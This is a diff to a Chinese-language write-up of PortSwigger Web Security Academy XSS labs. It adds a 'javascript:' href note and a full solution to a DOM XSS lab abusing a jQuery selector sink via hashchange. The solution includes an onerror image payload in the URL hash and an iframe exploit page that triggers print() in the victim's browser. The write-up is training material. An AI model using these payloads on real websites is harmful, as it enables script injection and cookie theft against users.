@@ -76,6 +76,7 @@ To solve this lab, perform a cross-site scripting attack that calls the alert fu
 
 To solve this lab, make the "back" link alert document.cookie. 
 ### 題目解釋
+Href 除了跳轉路徑之外，也可以塞 `javascript:alert(1)`
 ### 解答
 先隨便點到一篇文底下，例如
 
@@ -101,3 +102,77 @@ https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?retur
 然後按下 Back 就可以噴出餅乾了
 
 
+## [Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
+### 題目敘述
+ This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
+
+To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 
+
+### 題目解釋
+
+
+### 解答
+
+看起來可疑的程式碼在這邊
+```
+$(window).on('hashchange', function(){
+var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+if (post) post.get(0).scrollIntoView();
+```
+
+直接觀察，使用者可控的地方是 `window.location.hash`，也就是網址最後面的 `#`，例如使用
+```
+https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#Procrastination
+```
+
+可以直接跳到 `Procrastination` 的區塊，而其中，用上面的例子
+```
+window.location.hash.slice(1)
+```
+
+會回傳
+
+```
+"Procrastination"
+```
+
+而在前面有一個 `decodeURIComponent` 會做 URLDecode 的部分，整段他會做一個字串加法，再放到 `$()` 中
+
+字串加法在這邊
+```
+'section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'
+```
+
+經過了一些測試， JQuery 可以直接 parse HTML，而且不會特別去管語法的完整性，也就是說右括號不呱也沒關係，例如這樣就可以 XSS
+
+```
+$(`h2:contains(""<img src=1 onerror=alert(1)>`)
+```
+
+繼續測試發現，甚至這樣也可以
+```
+$(`h2:contains(""<img src=1 onerror=alert(1)>`)
+```
+
+所以那就用最簡單的方法，網址打
+```
+https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#%3Cimg%20src=1%20onerror=alert(1)%3E
+```
+
+但需要注意的是他的觸發條件是 `hashchange`，所以我們需要建立一個 iframe 來控制 change 的 src 讓他途中會變動
+
+```html
+<script>
+    function meow(){
+        console.log(document.getElementsByTagName("iframe")[0].src);
+      setTimeout(() => {
+        document.getElementsByTagName("iframe")[0].src="https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#%3Cimg%20src%3D1%20onerror%3Dprint%28%29%3E";
+        console.log(document.getElementsByTagName("iframe")[0].src);
+          }, 
+      1000);
+    }
+</script>
+
+<iframe src="https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#meow" onload="meow()">
+</iframe>
+```
